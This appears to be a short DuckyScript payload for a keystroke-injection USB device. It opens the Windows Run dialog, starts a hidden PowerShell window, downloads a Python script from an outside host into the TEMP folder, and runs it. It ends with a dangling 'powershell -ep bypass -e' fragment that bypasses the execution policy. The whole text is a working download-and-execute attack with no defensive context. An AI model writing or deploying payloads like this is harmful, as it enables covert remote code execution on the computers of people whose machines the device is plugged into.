
REM define vars
VAR $URL = 1.1.1.1

REM open "run"
DELAY 1000
GUI r

REM open powershell
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 500

REM download script
STRING Invoke-WebRequest -Uri "http://$URL/script.py" -OutFile "$env:TEMP\script.py"
ENTER
DELAY 500

REM run script
STRING python "$env:TEMP\script.py"
ENTER


powershell -ep bypass -e
